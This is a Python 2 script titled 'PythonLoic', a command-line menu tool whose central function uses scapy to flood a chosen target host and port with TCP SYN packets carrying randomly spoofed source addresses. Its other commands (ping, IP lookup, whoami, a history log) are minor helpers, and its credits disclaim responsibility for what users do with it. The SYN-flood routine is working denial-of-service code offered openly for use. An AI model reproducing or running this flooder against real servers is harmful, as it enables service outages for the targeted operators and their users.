def text_menu():
	try:
		import platform
	except ImportError:
		error = "Could not import platform"
		print(error)
		history_write(error)
	wrong_entry = 0
	help = '________________________________________________________\n|SYN to send TCP packets with syn header (syn flood)---|\n|PING just to ping a server----------------------------|\n|HISTORY to show history-------------------------------|\n|WHOAMI if you are amnesic-----------------------------|\n|IP to see your current ip adress----------------------|\n|______________________________________________________|'
	current_os = platform.system()
	credits()
	while True:
		command = raw_input("PythonLoic $ ")
		if command == "help": 
			print (help)
		elif command == "ip":
			print (get_ip())
		elif command == "whoami":
			print (get_username())
		elif command == "ping":
			host = raw_input("Host : ")
			if current_os in "Linux":
				arg="-c"
			elif current_os in "Windows":
				arg="-n"
			nbr = raw_input("Number of ping : ")
			print(ping(host, arg, nbr))
		elif command == "credits":
			credits()
		elif command == "exit":
			quit()
		elif command == "history":
			history_read()
		elif command == "syn":
			nbr = int(raw_input("Number of packet : "))
			port = int(raw_input("Port : "))
			target = raw_input("Target : ")
			if tcp_attack(target, port, nbr) == 0:
				print("Done, %i packets sent" % nbr)
			else:
				print("Error running the script.\nDid you run the script as root ?")
		else:
			wrong_entry += 1
			if wrong_entry == 3:
				print (help)
				wrong_entry = 0
				
def tcp_attack(target, port, nbr):
	try:
		from scapy.all import *
	except:
		print("Scapy importation error")
	try:
		import socket
		import random
		conf.iface='wlan0'
		ip = IP()
		try:
			ip.dst = socket.gethostbyname(target)
		except:
			print("Couldn't get the IP of the target")
		print("target IP : "+ip.dst)
		c = 0
		tcp = TCP()
		tcp.flags = 'S'
		tcp.dport = int(port)
		while c<=nbr:
			ip.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			tcp.sport = RandShort()
			packet=ip/tcp
			send(packet, verbose=0)
			if c % 20 == 0:
				print(str(c*100/nbr)+" %")
			c += 1
		history_write("tcp %s\n" % target)
		return 0
	except:
		return 1

def history_read():
	try:
		history = open("history.log", "r")
		text = history.read()
		history.close()
		print(text)
		return text
	except:
		history = open("history.log", "w")
		history.close()

	
def get_ip():
	try:
		import urllib
		ip = urllib.urlopen("http://automation.whatismyip.com/n09230945.asp").read()
		return ip
	except ImportError:
		error = "Could not import urllib"
		print(error)
		history_write(error)
	
def get_username():
	try:
		import getpass
		user = getpass.getuser()
		return user
	except ImportError:
		error = "Could not import getpass"
		print(error)
		history_write(error)
	
def ping(host, arg, nbr):
	try:
		import subprocess
		ping = subprocess.Popen(
		["ping", arg, nbr, host],
		stdout = subprocess.PIPE,
		stderr = subprocess.PIPE
		)
		out, error = ping.communicate()
		history_write("ping "+str(host))
		return out
	except ImportError:
		error = "Could not import subprocess"
		print(error)
		history_write(error)
	
def history_write(entry):
	try:
		history = open("history.log", "a")
		history.write(entry+"\n")
		history.close()
	except:
		print("Could not write history.log")
	
def credits():
	print("""/$$$$$$$              /$$     /$$                          
| $$__  $$            | $$    | $$                          
| $$  \ $$ /$$   /$$ /$$$$$$  | $$$$$$$   /$$$$$$  /$$$$$$$ 
| $$$$$$$/| $$  | $$|_  $$_/  | $$__  $$ /$$__  $$| $$__  $$
| $$____/ | $$  | $$  | $$    | $$  \ $$| $$  \ $$| $$  \ $$
| $$      | $$  | $$  | $$ /$$| $$  | $$| $$  | $$| $$  | $$
| $$      |  $$$$$$$  |  $$$$/| $$  | $$|  $$$$$$/| $$  | $$
|__/       \____  $$   \___/  |__/  |__/ \______/ |__/  |__/
           /$$  | $$                                        
          |  $$$$$$/                                        
           \______/                                         

 /$$        /$$$$$$  /$$$$$$  /$$$$$$ 
| $$       /$$__  $$|_  $$_/ /$$__  $$
| $$      | $$  \ $$  | $$  | $$  \__/
| $$      | $$  | $$  | $$  | $$      
| $$      | $$  | $$  | $$  | $$      
| $$      | $$  | $$  | $$  | $$    $$
| $$$$$$$$|  $$$$$$/ /$$$$$$|  $$$$$$/
|________/ \______/ |______/ \______/\n\nMade by Arnaud Alies and Raphael Kanapitsas\nWe are NOT responsible of what you do with this software. This software must NOT be sold""")

text_menu()
